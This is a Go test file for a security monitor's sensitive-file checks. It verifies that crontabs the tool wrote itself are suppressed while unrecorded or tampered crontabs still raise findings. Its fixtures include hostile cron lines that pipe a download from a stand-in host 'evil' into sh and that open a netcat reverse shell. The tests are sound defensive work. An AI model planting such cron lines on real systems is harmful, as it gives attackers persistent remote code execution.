package checks

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// A crontab CSM itself installed must not raise "new sensitive file appeared".
func TestEvaluateSensitiveFileAppearance_SuppressesCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/aromedenarghile"
	content := []byte("# CSM WP-Cron /home/aromedenarghile/public_html\n*/5 * * * * cd '/home/aromedenarghile/public_html' && '/usr/local/bin/php' wp-cron.php\n")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	RecordSelfWrite(path, content)
	if _, emit := EvaluateSensitiveFileAppearance(path); emit {
		t.Error("after RecordSelfWrite, the matching crontab appearance must be suppressed")
	}
}

// A crontab that appears WITHOUT a matching CSM self-write must still alarm.
func TestEvaluateSensitiveFileAppearance_FlagsUnrecordedCron(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/attacker"
	content := []byte("* * * * * curl http://evil/x | sh\n")
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("a crontab CSM did not write must still raise a finding")
	}
}

// Tamper layered on top of a CSM-written crontab changes the hash and must
// still alarm -- suppression is content-bound, not a path allowlist.
func TestEvaluateSensitiveFileAppearance_FlagsTamperedCSMCron(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/aromedenarghile"
	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, clean)

	tampered := append(append([]byte{}, clean...), []byte("* * * * * nc evil 4444 -e /bin/sh\n")...)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return tampered, nil }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("a tampered crontab (hash changed) must still raise a finding")
	}
}

func TestEvaluateSensitiveFileAppearance_ReadErrorFailsSafe(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/empty"
	RecordSelfWrite(path, nil)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return nil, os.ErrPermission }})

	if _, emit := EvaluateSensitiveFileAppearance(path); !emit {
		t.Error("an unreadable sensitive file must not be suppressed by an empty self-write record")
	}
}

// The realtime write path must also honor the self-write ledger.
func TestEvaluateSensitiveFileWrite_SuppressesCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/baxiro"
	content := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, content)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})

	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); emit {
		t.Error("realtime write event for a CSM-written crontab must be suppressed")
	}
}

func TestEvaluateSensitiveFileWrite_FlagsTamperedCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/baxiro"
	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, clean)
	tampered := append(append([]byte{}, clean...), []byte("* * * * * curl http://evil/x | sh\n")...)
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return tampered, nil }})

	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); !emit {
		t.Error("realtime write event for tampered self-write content must still raise a finding")
	}
}

func TestCheckSensitiveFilesHashChange_SuppressesCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	target, st := baselineSensitiveFileForSelfWriteTest(t, []byte("old cron\n"))

	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	if err := os.WriteFile(target, clean, 0o600); err != nil {
		t.Fatal(err)
	}
	RecordSelfWrite(target, clean)

	if got := CheckSensitiveFiles(context.Background(), &config.Config{}, st); len(got) != 0 {
		t.Fatalf("matching CSM self-write hash change must be suppressed, got %+v", got)
	}
}

func TestCheckSensitiveFilesHashChange_FlagsTamperedCSMSelfWrite(t *testing.T) {
	resetSelfWrites(t)
	target, st := baselineSensitiveFileForSelfWriteTest(t, []byte("old cron\n"))

	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(target, clean)
	tampered := append(append([]byte{}, clean...), []byte("* * * * * curl http://evil/x | sh\n")...)
	if err := os.WriteFile(target, tampered, 0o600); err != nil {
		t.Fatal(err)
	}

	got := CheckSensitiveFiles(context.Background(), &config.Config{}, st)
	if len(got) != 1 {
		t.Fatalf("tampered CSM self-write hash change must emit one finding, got %+v", got)
	}
}

func baselineSensitiveFileForSelfWriteTest(t *testing.T, initial []byte) (string, *state.Store) {
	t.Helper()
	root := t.TempDir()
	target := filepath.Join(root, "var/spool/cron/alice")
	if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, initial, 0o600); err != nil {
		t.Fatal(err)
	}

	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{target}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })

	st, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if got := CheckSensitiveFiles(context.Background(), &config.Config{}, st); len(got) != 0 {
		t.Fatalf("baseline run emitted findings: %+v", got)
	}
	return target, st
}
